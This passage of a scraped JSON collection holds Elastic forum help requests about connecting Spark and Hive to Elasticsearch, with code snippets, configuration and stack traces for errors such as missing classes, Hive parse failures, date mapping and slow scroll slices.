    "body": "Hi, I have created dataset/dataframe using the watermark and window function and writing the output to ElasticSearch is not working. However dataset/dataframe created without watermark and window inserts data into ElasticSearch. Please find the code snippet. val df = dsLog1.withWatermark(\"time\",\"3 minutes\").groupBy(window(col(\"time\"),\"3 minutes\",\"1 minute\")) .agg(count(col(\"column_name\"))) df.writeStream .outputMode(\"append\") .format(\"org.elasticsearch.spark.sql\") .option(\"es.nodes\", \"localhost\") .option(\"es.port\", \"9200\") //.option(\"checkpointLocation\", \"/tmp\") .option(\"es.resource\",\"test4/_doc\") .start() Thanks in Advance for the help.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "c5e731f2-cf03-496b-9828-dfb34e33ef9a",
    "url": "https://discuss.elastic.co/t/verify-connection-between-hdfs-and-elasticsearch/196351",
    "title": "Verify connection between hdfs and elasticsearch",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "varunakuraju",
    "date": "August 22, 2019, 2:45pm August 23, 2019, 5:01pm September 20, 2019, 5:05pm",
    "body": "Hi, How to verify the connectivity between the hdfs and elasticsearch. Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "072f401a-d6d8-4c14-9184-92b9b5992260",
    "url": "https://discuss.elastic.co/t/added-elasticsearch-and-hadoop-and-while-creating-external-table-getting-error/195938",
    "title": "Added elasticsearch and hadoop and while creating external table getting error",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "varunakuraju",
    "date": "August 20, 2019, 2:57pm August 23, 2019, 4:34pm September 20, 2019, 4:34pm",
    "body": "created table vgsale in hive after added es-hadoop connector successful and trying to create external table Added [file:///home/saivarunakuraju/elasticsearch-hadoop-hive-7.3.0.jar] to class path Added resources: [file:///home/saivarunakuraju/elasticsearch-hadoop-hive-7.3.0.jar] hive> CREATE EXTERNAL TABLE vgsales_es( > rank int, > Name string, > Platform string, > year int, > Genre string, > Publisher string, > nasales int, > eusales int, > jpsales int, > othersales int, > Globalsales int > ) > stored by 'org.elasticsearch.hadoop.hive.ESStorageHandler' > TBLPROPERTIES ('es.resource' = “vgsale/vgsals”, > 'es.nodes'='localhost'); MismatchedTokenException(24!=352) at org.antlr.runtime.BaseRecognizer.recoverFromMismatchedToken(BaseRecognizer.java:617) at org.antlr.runtime.BaseRecognizer.match(BaseRecognizer.java:115) at org.apache.hadoop.hive.ql.parse.HiveParser.keyValueProperty(HiveParser.java:28199) at org.apache.hadoop.hive.ql.parse.HiveParser.tablePropertiesList(HiveParser.java:27995) at org.apache.hadoop.hive.ql.parse.HiveParser.tableProperties(HiveParser.java:27867) at org.apache.hadoop.hive.ql.parse.HiveParser.tablePropertiesPrefixed(HiveParser.java:27804) at org.apache.hadoop.hive.ql.parse.HiveParser.createTableStatement(HiveParser.java:6338) at org.apache.hadoop.hive.ql.parse.HiveParser.ddlStatement(HiveParser.java:3808) at org.apache.hadoop.hive.ql.parse.HiveParser.execStatement(HiveParser.java:2382) at org.apache.hadoop.hive.ql.parse.HiveParser.statement(HiveParser.java:1333) at org.apache.hadoop.hive.ql.parse.ParseDriver.parse(ParseDriver.java:208) at org.apache.hadoop.hive.ql.parse.ParseUtils.parse(ParseUtils.java:77) at org.apache.hadoop.hive.ql.parse.ParseUtils.parse(ParseUtils.java:70) at org.apache.hadoop.hive.ql.Driver.compile(Driver.java:468) at org.apache.hadoop.hive.ql.Driver.compileInternal(Driver.java:1317) at org.apache.hadoop.hive.ql.Driver.runInternal(Driver.java:1457) at org.apache.hadoop.hive.ql.Driver.run(Driver.java:1237) at org.apache.hadoop.hive.ql.Driver.run(Driver.java:1227) at org.apache.hadoop.hive.cli.CliDriver.processLocalCmd(CliDriver.java:233) at org.apache.hadoop.hive.cli.CliDriver.processCmd(CliDriver.java:184) at org.apache.hadoop.hive.cli.CliDriver.processLine(CliDriver.java:403) at org.apache.hadoop.hive.cli.CliDriver.executeDriver(CliDriver.java:821) at org.apache.hadoop.hive.cli.CliDriver.run(CliDriver.java:759) at org.apache.hadoop.hive.cli.CliDriver.main(CliDriver.java:686) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.hadoop.util.RunJar.run(RunJar.java:244) at org.apache.hadoop.util.RunJar.main(RunJar.java:158) FAILED: ParseException line 15:16 cannot recognize input near 'es' '.' 'resource' in table properties list hive>",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "dfeccfc1-6334-462c-80d4-5efbec9d98ce",
    "url": "https://discuss.elastic.co/t/hive-not-working-with-elasticsearch/192894",
    "title": "Hive not working with Elasticsearch",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "bharat1",
    "date": "July 30, 2019, 12:27pm September 6, 2019, 12:18pm August 20, 2019, 4:56am August 20, 2019, 8:44pm August 22, 2019, 8:40pm September 19, 2019, 8:40pm",
    "body": "I am trying to bring Hive table data to Elasticsearch but it's failing to get this through, any help will be appreciated. The error I get is \"Unable to find class: org.elasticsearch.hadoop.hive.EsHiveInputFormat\" and \"FAILED: Execution Error, return code 2 from org.apache.hadoop.hive.ql.exec.mr.MapRedTask\" The hive engine is set to mr Logging initialized using configuration in file:/etc/hive/2.6.0.3-8/0/hive-log4j.properties OK Time taken: 1.118 seconds Query ID = hive_20190725220921_fd962234-e1a2-41af-89f3-b7e4cc27e86d Total jobs = 1 Launching Job 1 out of 1 Number of reduce tasks is set to 0 since there's no reduce operator Starting Job = job_1563949354091_0016, Tracking URL = http://hadoop-node.test.com:8088/proxy/application_1563949354091_0016/ Kill Command = /usr/hdp/2.6.0.3-8/hadoop/bin/hadoop job -kill job_1563949354091_0016 Hadoop job information for Stage-1: number of mappers: 1; number of reducers: 0 2019-07-25 22:09:28,184 Stage-1 map = 0%, reduce = 0% 2019-07-25 22:09:41,582 Stage-1 map = 100%, reduce = 0% Ended Job = job_1563949354091_0016 with errors Error during job, obtaining debugging information... Examining task ID: task_1563949354091_0016_m_000000 (and more) from job job_1563949354091_0016 Task with the most failures(4): ----- Task ID: task_1563949354091_0016_m_000000 URL: http://hadoop-node.test.com:8088/taskdetails.jsp?jobid=job_1563949354091_0016&tipid=task_1563949354091_0016_m_000000 ----- Diagnostic Messages for this Task: Error: java.lang.RuntimeException: Failed to load plan: hdfs://hadoop-node.test.com:8020/tmp/hive/hive/d6d4079b-4813-4e2f-97be-5ea3acea7efa/hive_2019-07-25_22-09-21_665_114610607148402302-1/-mr-10002/268762c6-18a3-467a-936e-7cab06dd1f1c/map.xml: org.apache.hive.com.esotericsoftware.kryo.KryoException: Unable to find class: org.elasticsearch.hadoop.hive.EsHiveInputFormat Serialization trace: inputFileFormatClass (org.apache.hadoop.hive.ql.plan.TableDesc) tableInfo (org.apache.hadoop.hive.ql.plan.FileSinkDesc) conf (org.apache.hadoop.hive.ql.exec.FileSinkOperator) childOperators (org.apache.hadoop.hive.ql.exec.SelectOperator) childOperators (org.apache.hadoop.hive.ql.exec.TableScanOperator) aliasToWork (org.apache.hadoop.hive.ql.plan.MapWork) removing log lines due to character limitations . . at javax.security.auth.Subject.doAs(Subject.java:422) at org.apache.hadoop.security.UserGroupInformation.doAs(UserGroupInformation.java:1866) at org.apache.hadoop.mapred.YarnChild.main(YarnChild.java:164) Caused by: org.apache.hive.com.esotericsoftware.kryo.KryoException: Unable to find class: org.elasticsearch.hadoop.hive.EsHiveInputFormat Serialization trace: inputFileFormatClass (org.apache.hadoop.hive.ql.plan.TableDesc) tableInfo (org.apache.hadoop.hive.ql.plan.FileSinkDesc) conf (org.apache.hadoop.hive.ql.exec.FileSinkOperator) childOperators (org.apache.hadoop.hive.ql.exec.SelectOperator) childOperators (org.apache.hadoop.hive.ql.exec.TableScanOperator) aliasToWork (org.apache.hadoop.hive.ql.plan.MapWork) at org.apache.hive.com.esotericsoftware.kryo.util.DefaultClassResolver.readName(DefaultClassResolver.java:138) at org.apache.hive.com.esotericsoftware.kryo.util.DefaultClassResolver.readClass(DefaultClassResolver.java:115) at org.apache.hive.com.esotericsoftware.kryo.Kryo.readClass(Kryo.java:656) at org.apache.hive.com.esotericsoftware.kryo.serializers.DefaultSerializers$ClassSerializer.read(DefaultSerializers.java:238) at org.apache.hive.com.esotericsoftware.kryo.serializers.DefaultSerializers$ClassSerializer.read(DefaultSerializers.java:226) at org.apache.hive.com.esotericsoftware.kryo.Kryo.readObjectOrNull(Kryo.java:745) at org.apache.hive.com.esotericsoftware.kryo.serializers.ObjectField.read(ObjectField.java:113) at org.apache.hive.com.esotericsoftware.kryo.serializers.FieldSerializer.read(FieldSerializer.java:507) at org.apache.hive.com.esotericsoftware.kryo.Kryo.readObject(Kryo.java:694) at org.apache.hive.com.esotericsoftware.kryo.serializers.ObjectField.read(ObjectField.java:106) at org.apache.hive.com.esotericsoftware.kryo.serializers.FieldSerializer.read(FieldSerializer.java:507) at org.apache.hive.com.esotericsoftware.kryo.Kryo.readClassAndObject(Kryo.java:776) at org.apache.hive.com.esotericsoftware.kryo.serializers.MapSerializer.read(MapSerializer.java:139) at org.apache.hive.com.esotericsoftware.kryo.serializers.MapSerializer.read(MapSerializer.java:17) at org.apache.hive.com.esotericsoftware.kryo.Kryo.readObject(Kryo.java:694) at org.apache.hive.com.esotericsoftware.kryo.serializers.ObjectField.read(ObjectField.java:106) at org.apache.hive.com.esotericsoftware.kryo.serializers.FieldSerializer.read(FieldSerializer.java:507) at org.apache.hive.com.esotericsoftware.kryo.Kryo.readObject(Kryo.java:672) at org.apache.hadoop.hive.ql.exec.Utilities.deserializeObjectByKryo(Utilities.java:1182) at org.apache.hadoop.hive.ql.exec.Utilities.deserializePlan(Utilities.java:1069) at org.apache.hadoop.hive.ql.exec.Utilities.deserializePlan(Utilities.java:1083) at org.apache.hadoop.hive.ql.exec.Utilities.getBaseWork(Utilities.java:439) ... 13 more Caused by: java.lang.ClassNotFoundException: org.elasticsearch.hadoop.hive.EsHiveInputFormat at java.net.URLClassLoader.findClass(URLClassLoader.java:381) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) at java.lang.Class.forName0(Native Method) at java.lang.Class.forName(Class.java:348) at org.apache.hive.com.esotericsoftware.kryo.util.DefaultClassResolver.readName(DefaultClassResolver.java:136) ... 49 more Container killed by the ApplicationMaster. Container killed on request. Exit code is 143 Container exited with a non-zero exit code 143 FAILED: Execution Error, return code 2 from org.apache.hadoop.hive.ql.exec.mr.MapRedTask MapReduce Jobs Launched: Stage-Stage-1: Map: 1 HDFS Read: 0 HDFS Write: 0 FAIL Total MapReduce CPU Time Spent: 0 msec",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "69fe9fdf-ed10-4196-895c-7d31a3f65f78",
    "url": "https://discuss.elastic.co/t/date-format-issue-when-passing-data-from-spark-to-elasticsearch/195704",
    "title": "Date format issue when passing data from spark to ElasticSearch",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Yoav_Ben_Moha",
    "date": "August 20, 2019, 7:06am August 19, 2019, 9:36am August 19, 2019, 7:30pm August 20, 2019, 6:05pm September 17, 2019, 6:04pm",
    "body": "I have successfuly uploaded data from spark into elasticsearch 7. The date format i have in the csv that i am reading are: yyyy-MM-dd+HH:mm:ss.SSS val cdr=spark.read.option(\"delimiter\", \";\") .option(\"timestampFormat\",\"yyyy-MM-dd+HH:mm:ss.SSS\") .schema(customSchema) .csv(\"/data/staging/abc\") Index created in elasticsearch didnt recocnized those values as date. It was automaically maped by ES as: \"ING_CALL_ANSWER_TIME\": { \"type\": \"long\" Does the above format is not a valid date in ES ? Thanks",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "54ffaf85-7ae8-4e09-a919-6f775889d8e6",
    "url": "https://discuss.elastic.co/t/too-many-slices-lead-to-bloat-of-thread-pool-queue-and-degradation-of-performance/189833",
    "title": "Too many slices lead to bloat of thread pool queue and degradation of performance",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "lonlylocly",
    "date": "July 10, 2019, 5:03pm July 23, 2019, 11:22am August 14, 2019, 7:02pm August 16, 2019, 1:51pm September 13, 2019, 1:51pm",
    "body": "Hello dear sirs, We are using .esJsonRDD() to copy an index from an Elasticsearch cluster to Spark cluster, and lately we started to observe that this copy is taking 10-14 hours instead of 2-3. Here's what is going on. Cluster and index setup We have an Elasticsearch 6.8 cluster on AWS EC2 with 3 machines, 2 cores/14 Gb RAM each (i3.large). Elasticsearch is configured to use 7Gb of memory. The index that we copy contains 54 million documents, which correspond to 8 shards ~20 Gb each. Performance metrics CPU of one of the nodes is through the roof: 2019-07-10_18-00-58.png1474×317 69.2 KB So is the Load Average. Also we notice that thread pool queue is at size 60 and stays like this: 2019-07-10_18-05-26.png735×321 18.5 KB And search query latency is also very big on that instance: 2019-07-10_18-06-06.png747×287 20.5 KB Logs We enabled logging of slow queries, and here's what we saw: [2019-07-10T14:44:50,844][WARN ][index.search.slowlog.query] [AT1mr_C] [index-XXX][1] took[1.3s], took_millis[1327], total_hits[100044], types[person], stats[], search_type[QUERY_THEN_FETCH], total_shards[1], source[{\"size\":50,\"query\":{\"match_all\":{\"boost\":1.0}},\"sort\":[{\"_doc\":{\"order\":\"asc\"}}],\"slice\":{\"field\":\"_id\",\"id\":63,\"max\":68}}], id[], [2019-07-10T14:44:51,909][WARN ][index.search.slowlog.query] [AT1mr_C] [index-XXX][1] took[1.5s], took_millis[1570], total_hits[100006], types[person], stats[], search_type[QUERY_THEN_FETCH], total_shards[1], source[{\"size\":50,\"query\":{\"match_all\":{\"boost\":1.0}},\"sort\":[{\"_doc\":{\"order\":\"asc\"}}],\"slice\":{\"field\":\"_id\",\"id\":32,\"max\":68}}], id[], [2019-07-10T14:44:52,468][WARN ][index.search.slowlog.query] [AT1mr_C] [index-XXX][1] took[1.5s], took_millis[1539], total_hits[100337], types[person], stats[], search_type[QUERY_THEN_FETCH], total_shards[1], source[{\"size\":50,\"query\":{\"match_all\":{\"boost\":1.0}},\"sort\":[{\"_doc\":{\"order\":\"asc\"}}],\"slice\":{\"field\":\"_id\",\"id\":59,\"max\":68}}], id[], [2019-07-10T14:44:52,526][WARN ][index.search.slowlog.query] [AT1mr_C] [index-XXX][4] took[1s], took_millis[1034], total_hits[100538], types[person], stats[], search_type[QUERY_THEN_FETCH], total_shards[1], source[{\"size\":50,\"query\":{\"match_all\":{\"boost\":1.0}},\"sort\":[{\"_doc\":{\"order\":\"asc\"}}],\"slice\":{\"field\":\"_id\",\"id\":11,\"max\":68}}], id[], Basically, there are 68 parallel scrolls. Knowing that the thread pool size is 60 it is safe to say that most of the time those slices are waiting, not improving the speed of reading. (I should say that we actually have 2 such indexes and do 2 esJsonRDD() in parallel.) What I have seen from my own experiments with Elasticsearch performance under load, when thread pool becomes of non-zero size performance of that node degrades much faster, like in this case, leaving an impression that management of the thread pool consumes a lof of CPU and requires a lot of context switching (hence high load average). An obvious fix would be to set the amount of parallel scroll requests (slices) so the throughput of a single node is enough. I couldn't find any way to configure this slice number. The closest thing seems to be the es.input.max.docs.per.partition but I am not sure if it is going to work. My question is: How can we prevent Elasticsearch from getting clogged with too many parallel scroll slices, executed by esJsonRDD? Or better, what would be the most effective way to dump contents of an Elasticsearch index to Spark? Any advice or suggestion is welcome! Thank you! P.S. I was considering to file a bug in elasticsearch-hadoop since this slice-vs-thread pool size thing didn't seem right, but I was also not sure this description will be enough to narrow down the problem, so I decided to create a post here in hope that ES devs will see it and help me reason about the problem. P.P.S. I have just checked, we use elasticsearch-hadoop=6.6.0 but I think little minor version difference should not impact. We use 8 spark slave machines.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "1941719d-dc0d-423f-a1ac-bb538cc96471",
    "url": "https://discuss.elastic.co/t/hadoop-why-does-the-default-value-of-es-batch-write-refresh-is-true/191955",
    "title": "[hadoop] Why does the default value of es.batch.write.refresh is true?",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "f9865",
    "date": "July 24, 2019, 6:22am August 14, 2019, 7:14pm August 15, 2019, 3:56am August 15, 2019, 1:57pm August 16, 2019, 3:45am September 13, 2019, 3:45am",
    "body": "elasticsearch-hadoop document link says es.batch.write.refresh (default true) Whether to invoke an index refresh or not after a bulk update has been completed. Note this is called only after the entire write (meaning multiple bulk updates) have been executed. However, the official document of ES about refresh says that The Index, Update, Delete, and Bulk APIs support setting refresh to control when changes made by this request are made visible to search. This (set refresh=true of the bulk request) should ONLY be done after careful thought and verification that it does not lead to poor performance, both from an indexing and a search standpoint. true creates less efficient indexes constructs (tiny segments) that must later be merged into more efficient index constructs (larger segments). Meaning that the cost of true is paid at index time to create the tiny segment, at search time to search the tiny segment, and at merge time to make the larger segments. The confliction between their documents is confusing. Can anybody help explain more about the reason that elastic-hadoop use true as the default value?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "29b3ea36-8601-4c81-b01b-6d15f56b2675",
    "url": "https://discuss.elastic.co/t/how-to-create-an-external-table-on-es-document-uisng-spark-sql-es-hadoop-6-7-0-and-es-6-7-0/195228",
    "title": "How to create an external Table on ES document uisng Spark SQL(ES-Hadoop 6.7.0 and ES 6.7.0)",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Srinivas2",
    "date": "August 14, 2019, 3:23pm August 14, 2019, 7:27pm August 15, 2019, 6:39pm September 12, 2019, 6:39pm",
    "body": "Hi Team, Requesting you help. Is it possible to create a table using spark-sql like mentioned here (https://docs.databricks.com/spark/latest/data-sources/elasticsearch.html [Use SQL to access Elasticsearch index]) I am able to create external table successfully on top of ES document using ES-hive using ESStorage Handler , however I am unable to create a table using spark-sql synstax ,and using below command. create table elasticsearch_poc using org.elasticsearch.spark.sql options('resource'='indexname', 'nodes'= 'node name', 'es.nodes.wan.only'='true', 'es.port'='portnumber' ); Below command is using to create table(successfully) using HIVE. create external table elasticserach_test(col1 STRING,col2 STRING) STORED BY 'org.elasticsearch.hadoop.hive.EsStorageHandler' TBLPROPERTIES( 'es.nodes'='nodeaddress', 'es.port'='portnumber', 'es.resource'='resourcenamet' , 'es.nodes.wan.only' = 'true', 'es.nodes.discover'='true', 'es.mapping.names'='col1:col1,col2:col2' ) Regards, Srini",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "851247a1-650f-4a2a-ba3b-6c8292fd8264",
    "url": "https://discuss.elastic.co/t/es-ece-2-2-hadoop-connectivity/194461",
    "title": "ES(ECE 2.2) - HADOOP Connectivity",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "rijash",
    "date": "August 8, 2019, 3:08pm August 14, 2019, 7:20pm August 14, 2019, 8:58pm September 11, 2019, 8:58pm",
    "body": "Hi, I am getting the below error while trying to ingest data to ES (ECE) from hadoop (HIVE) query. =============== 2019-08-08 13:55:24,957 INFO [main]: httpclient.HttpMethodDirector (HttpMethodDirector.java:executeWithRetry(444)) - Retrying request 2019-08-08 13:55:24,958 ERROR [main]: rest.NetworkClient (NetworkClient.java:execute(147)) - Node [d985e2b66da74bd1860a09a9347c3506.elkeu.ondemand.com:443] failed (java.net.ConnectException: Connection refused (Connection refused)); no other nodes left - aborting... 2019-08-08 13:55:24,959 ERROR [main]: CliDriver (SessionState.java:printError(1089)) - Failed with exception java.io.IOException:org.elasticsearch.hadoop.EsHadoopIllegalArgumentException: Cannot detect ES version - typically this happens if the network/Elasticsearch cluster is not accessible or when targeting a WAN/Cloud instance without the proper setting 'es.nodes.wan.only' java.io.IOException: org.elasticsearch.hadoop.EsHadoopIllegalArgumentException: Cannot detect ES version - typically this happens if the network/Elasticsearch cluster is not accessible or when targeting a WAN/Cloud instance without the proper setting 'es.nodes.wan.only' at org.apache.hadoop.hive.ql.exec.FetchOperator.getNextRow(FetchOperator.java:520) at org.apache.hadoop.hive.ql.exec.FetchOperator.pushRow(FetchOperator.java:427) at org.apache.hadoop.hive.ql.exec.FetchTask.fetch(FetchTask.java:146) at org.apache.hadoop.hive.ql.Driver.getResults(Driver.java:1773) at org.apache.hadoop.hive.cli.CliDriver.processLocalCmd(CliDriver.java:237) at org.apache.hadoop.hive.cli.CliDriver.processCmd(CliDriver.java:169) at org.apache.hadoop.hive.cli.CliDriver.processLine(CliDriver.java:380) at org.apache.hadoop.hive.cli.CliDriver.executeDriver(CliDriver.java:740) at org.apache.hadoop.hive.cli.CliDriver.run(CliDriver.java:685) at org.apache.hadoop.hive.cli.CliDriver.main(CliDriver.java:625) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.hadoop.util.RunJar.run(RunJar.java:233) at org.apache.hadoop.util.RunJar.main(RunJar.java:148) Caused by: org.elasticsearch.hadoop.EsHadoopIllegalArgumentException: Cannot detect ES version - typically this happens if the network/Elasticsearch cluster is not accessible or when targeting a WAN/Cloud instance without the proper setting 'es.nodes.wan.only' at org.elasticsearch.hadoop.rest.InitializationUtils.discoverClusterInfo(InitializationUtils.java:340) at org.elasticsearch.hadoop.hive.HiveUtils.init(HiveUtils.java:197) at org.elasticsearch.hadoop.hive.EsHiveInputFormat.getSplits(EsHiveInputFormat.java:112) at org.elasticsearch.hadoop.hive.EsHiveInputFormat.getSplits(EsHiveInputFormat.java:51) at org.apache.hadoop.hive.ql.exec.FetchOperator.getNextSplits(FetchOperator.java:371) at org.apache.hadoop.hive.ql.exec.FetchOperator.getRecordReader(FetchOperator.java:303) at org.apache.hadoop.hive.ql.exec.FetchOperator.getNextRow(FetchOperator.java:458) ... 15 more Caused by: org.elasticsearch.hadoop.rest.EsHadoopNoNodesLeftException: Connection error (check network and/or proxy settings)- all nodes failed; tried [[d985e2b66da74bd1860a09a9347c3506.elkeu.ondemand.com:443]] at org.elasticsearch.hadoop.rest.NetworkClient.execute(NetworkClient.java:152) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:424) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:388) at org.elasticsearch.hadoop.rest.RestClient.execute(RestClient.java:392) at org.elasticsearch.hadoop.rest.RestClient.get(RestClient.java:168) at org.elasticsearch.hadoop.rest.RestClient.mainInfo(RestClient.java:735) at org.elasticsearch.hadoop.rest.InitializationUtils.discoverClusterInfo(InitializationUtils.java:330) ... 21 more 2019-08-08 13:55:24,959 INFO [main]: exec.TableScanOperator (Operator.java:close(616)) - Closing operator TS[0] 2019-08-08 13:55:24,959 INFO [main]: exec.SelectOperator (Operator.java:close(616)) - Closing operator SEL[1] 2019-08-08 13:55:24,959 INFO [main]: exec.ListSinkOperator (Operator.java:close(616)) - Closing operator OP[3] 2019-08-08 13:55:24,963 INFO [main]: CliDriver (SessionState.java:printInfo(1066)) - Time taken: 0.051 seconds 2019-08-08 13:55:24,963 INFO [main]: log.PerfLogger (PerfLogger.java:PerfLogBegin(149)) - 2019-08-08 13:55:24,963 INFO [main]: log.PerfLogger (PerfLogger.java:PerfLogEnd(177)) - </PERFLOG method=releaseLocks start=1565272524963 end=1565272524963 duration=0 from=org.apache.hadoop.hive.ql.Driver> Below configuration is working fine for ES as independent component but failing in ECE. ==================== 'es.index.read.missing.as.empty'='true', 'es.mapping.date.rich'='false', 'es.mapping.names'='date:@timestamp', 'es.net.http.auth.pass'='<es_cluster_pwd>', 'es.net.http.auth.user'='<es_cluster_id>', 'es.net.ssl'='true', 'es.net.ssl.cert.allow.self.signed'='true', 'es.net.ssl.keystore.location'='file:///etc/ssl/certs/1.jks', 'es.net.ssl.keystore.pass'='<jks_pwd>', 'es.net.ssl.keystore.type'='jks', 'es.net.ssl.protocol'='SSL', 'es.nodes.wan.only'='true', 'es.nodes'='d985e2b66da74bd1860a09a9347c3506.elkeu.ondemand.com:443', 'es.query'='?q=*', 'es.resource'='users/user-events'",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "df1fc023-98c9-47c2-a9c2-d766292c5532",
    "url": "https://discuss.elastic.co/t/caused-by-org-apache-spark-sparkexception-data-of-type-java-util-gregoriancalendar-cannot-be-used/194471",
    "title": "Caused by: org.apache.spark.SparkException: Data of type java.util.GregorianCalendar cannot be used",
    "category": [
      "Hadoop and Elasticsearch"
    ],
    "author": "Mayukh",
    "date": "August 9, 2019, 5:34am August 14, 2019, 7:25pm September 11, 2019, 7:25pm",
    "body": "Hi, I am trying to write a PySpark RDD into Elasticsearch, however I am getting the GregorianCalendar error. Any suggestions or help would be appreciated. es_fault_df = sqlContext.sql(\"select * from fault_search_all limit 10\") es_fault_rdd = es_fault_df.rdd.map(lambda item: ('key', {'objid': item['objid'],'customer_name': item['customer_name'] ,'veh_hdr':item['veh_hdr'],'road_number':item['road_number'],'fleet_name':item['fleet_name'],'model_desc':item['model_desc'],'fault_code':item['fault_code'],'sub_id':item['sub_id'],'fault_desc':item['fault_desc'],'occur_date':item['occur_date'],'fault_reset_date':item['fault_reset_date'],'fault_origin':item['fault_origin'],'record_type':item['record_type'],'gps_latitude':item['gps_latitude'],'gps_longitude':item['gps_longitude'],'offboard_load_date':item['offboard_load_date'],'loco_speed':item['loco_speed'],'engine_speed':item['engine_speed'],'notch':item['notch'],'direction':item['direction'],'hp':item['hp'],'water_temp':item['water_temp'],'oil_temp':item['oil_temp'],'mode_call':item['mode_call'],'loco_state_desc':item['loco_state_desc'],'software_subid':item['software_subid']})) es_fault_rdd.saveAsNewAPIHadoopFile(path='-',outputFormatClass=\"org.elasticsearch.hadoop.mr.EsOutputFormat\",keyClass=\"org.apache.hadoop.io.NullWritable\", valueClass=\"org.elasticsearch.hadoop.mr.LinkedMapWritable\", conf=es_conf) Logs: Caused by: org.apache.spark.SparkException: Task failed while writing rows at org.apache.spark.internal.io.SparkHadoopMapReduceWriter$.org$apache$spark$internal$io$SparkHadoopMapReduceWriter$$executeTask(SparkHadoopMapReduceWriter.scala:178) at org.apache.spark.internal.io.SparkHadoopMapReduceWriter$$anonfun$3.apply(SparkHadoopMapReduceWriter.scala:89) at org.apache.spark.internal.io.SparkHadoopMapReduceWriter$$anonfun$3.apply(SparkHadoopMapReduceWriter.scala:88) at org.apache.spark.scheduler.ResultTask.runTask(ResultTask.scala:87) at org.apache.spark.scheduler.Task.run(Task.scala:108) at org.apache.spark.executor.Executor$TaskRunner.run(Executor.scala:338) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ... 1 more Caused by: org.apache.spark.SparkException: Data of type java.util.GregorianCalendar cannot be used at org.apache.spark.api.python.JavaToWritableConverter.org$apache$spark$api$python$JavaToWritableConverter$$convertToWritable(PythonHadoopUtil.scala:141) at org.apache.spark.api.python.JavaToWritableConverter$$anonfun$org$apache$spark$api$python$JavaToWritableConverter$$convertToWritable$1.apply(PythonHadoopUtil.scala:134) at org.apache.spark.api.python.JavaToWritableConverter$$anonfun$org$apache$spark$api$python$JavaToWritableConverter$$convertToWritable$1.apply(PythonHadoopUtil.scala:133) at scala.collection.Iterator$class.foreach(Iterator.scala:893) at scala.collection.AbstractIterator.foreach(Iterator.scala:1336) at scala.collection.IterableLike$class.foreach(IterableLike.scala:72) at scala.collection.AbstractIterable.foreach(Iterable.scala:54) at org.apache.spark.api.python.JavaToWritableConverter.org$apache$spark$api$python$JavaToWritableConverter$$convertToWritable(PythonHadoopUtil.scala:133) at org.apache.spark.api.python.JavaToWritableConverter.convert(PythonHadoopUtil.scala:148) at org.apache.spark.api.python.JavaToWritableConverter.convert(PythonHadoopUtil.scala:115) at org.apache.spark.api.python.PythonHadoopUtil$$anonfun$convertRDD$1.apply(PythonHadoopUtil.scala:181) at org.apache.spark.api.python.PythonHadoopUtil$$anonfun$convertRDD$1.apply(PythonHadoopUtil.scala:181) at scala.collection.Iterator$$anon$11.next(Iterator.scala:409) at org.apache.spark.internal.io.SparkHadoopMapReduceWriter$$anonfun$4.apply(SparkHadoopMapReduceWriter.scala:147) at org.apache.spark.internal.io.SparkHadoopMapReduceWriter$$anonfun$4.apply(SparkHadoopMapReduceWriter.scala:144) at org.apache.spark.util.Utils$.tryWithSafeFinallyAndFailureCallbacks(Utils.scala:1371) at org.apache.spark.internal.io.SparkHadoopMapReduceWriter$.org$apache$spark$internal$io$SparkHadoopMapReduceWriter$$executeTask(SparkHadoopMapReduceWriter.scala:159) ... 8 more",
    "website_area": "discuss",
    "replies": 3
  }
]